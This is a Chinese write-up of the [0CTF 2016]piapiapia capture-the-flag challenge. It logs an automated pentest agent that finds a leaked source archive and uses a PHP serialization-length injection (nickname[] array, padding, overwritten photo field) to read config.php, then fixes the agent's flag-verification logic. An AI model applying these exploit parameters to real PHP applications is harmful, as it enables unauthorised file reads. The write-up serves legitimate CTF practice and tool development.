# DASCTF / [0CTF 2016]piapiapia profile photo poisoning 做题 WP

> 日期：2026-06-09  
> 平台：DASCTF practice / BUUCTF 公开练习  
> 题目：`[0CTF 2016]piapiapia`  
> 类型：Web / 源码泄露 / PHP 序列化字段污染 / profile photo file read  
> 最终 flag：`DASCTF{08043e33-ac5d-4a90-a2d9-edebdc70ade4}`  
> 本次目标：继续用真实靶场检验 FlagHunter 对源码包分析、登录注册流程、profile 字段污染和运行时 flag 验证的自动化能力。

---

## 1. 环境与入口

靶场地址：

```text
http://c9c0c8c0a1d64676a4ca131f.http-ctf2.dasctf.com:80
```

约束：

- 不截图。
- 不导出大体积响应。
- 只做少量 HTTP 侦察、源码包验证和登录态内请求。

---

## 2. 自动化基线

首次运行：

```powershell
.\.venv\Scripts\pentestagent run -t "http://c9c0c8c0a1d64676a4ca131f.http-ctf2.dasctf.com:80" --mode ctf --max-loops 6 "拿到flag。优先少量HTTP侦察、源码泄露、登录注册和文件读取线索，不要大规模扫描。"
```

项目表现：

```text
detected_type=sqli
backup candidate: /www.zip
profile_photo_poisoning=true
runtime flag: DASCTF{08043e33-ac5d-4a90-a2d9-edebdc70ade4}
stop reason: runtime flag but not verified
```

手动提交平台后返回：

```text
您已解决此题目
```

说明项目已经打通 exploit，但结束语义过保守。

---

## 3. 利用链摘要

源码包：

```text
/www.zip
```

包内关键文件：

```text
index.php
register.php
update.php
profile.php
class.php
config.php
```

核心思路：

1. 注册新用户并登录。
2. `update.php` 更新 profile 时，`nickname[]` 数组触发过滤/序列化长度错位。
3. 构造 padding，让序列化字符串重新闭合并覆盖 `photo` 字段。
4. 将 `photo` 指向 `config.php`。
5. 访问 `profile.php`，页面用 base64 data URI 展示头像内容。
6. 解码 data URI 后得到 `config.php`，其中包含 flag。

项目自动提取出的 exploit 关键参数：

```text
nickname_field = nickname[]
padding_token = where
padding_repeats = 34
payload_suffix = ";}s:5:"photo";s:10:"config.php";}
poison_target = config.php
```

最终 flag：

```text
DASCTF{08043e33-ac5d-4a90-a2d9-edebdc70ade4}
```

---

## 4. 项目缺口

这道题暴露的不是“不会解”，而是结果收敛问题：

- `profile-photo-file-read` 是真实运行时 exploit 回显，不是静态源码候选。
- verifier 给出 `decision=runtime`，confidence 为强 runtime 证据。
- `_attempt_profile_photo_poisoning_chain()` 只在 `decision == "verified"` 时返回成功。
- 因此项目明明已经拿到正确 flag，却继续探索其他 backup 候选，最后停在 `wait_for_verification`。

---

## 5. 修复记录

文件：

```text
pentestagent/agents/pa_agent/ctf_dispatcher.py
tests/unit/agents/test_ctf_dispatcher.py
```

修复点：

- `_attempt_profile_photo_poisoning_chain()` 对 `verification.decision in {"verified", "runtime"}` 都返回 `_ChainOutcome(flag=...)`。
- 新增回归：

```text
test_profile_photo_poisoning_returns_runtime_flag
```

---

## 6. 验证记录

profile-photo 相关回归：

```powershell
.\.venv\Scripts\pytest tests\unit\agents\test_ctf_dispatcher.py -k "profile_photo_poisoning_returns_runtime_flag or profile_photo" -vv
```

结果：

```text
5 passed
```

活靶复测：

```powershell
.\.venv\Scripts\pentestagent run -t "http://c9c0c8c0a1d64676a4ca131f.http-ctf2.dasctf.com:80" --mode ctf --max-loops 6 "拿到flag。优先少量HTTP侦察、源码泄露、登录注册和文件读取线索，不要大规模扫描。"
```

结果：

```text
CTF Result: DASCTF{08043e33-ac5d-4a90-a2d9-edebdc70ade4}
Flag verified: DASCTF{08043e33-ac5d-4a90-a2d9-edebdc70ade4}
Duration: 0m 32s
```

---

## 7. 可复用经验

1. `profile-photo-file-read` 属于强 runtime evidence，不能按静态源码 flag 候选处理。
2. 当 exploit 已经实际读取目标文件并提取 flag，应允许 dispatcher 成功返回，同时保留 verifier 的 runtime/verified 证据层。
3. 基线测试要区分“不会解题”和“已解但结束语义过保守”，这类问题对用户体验影响很大。
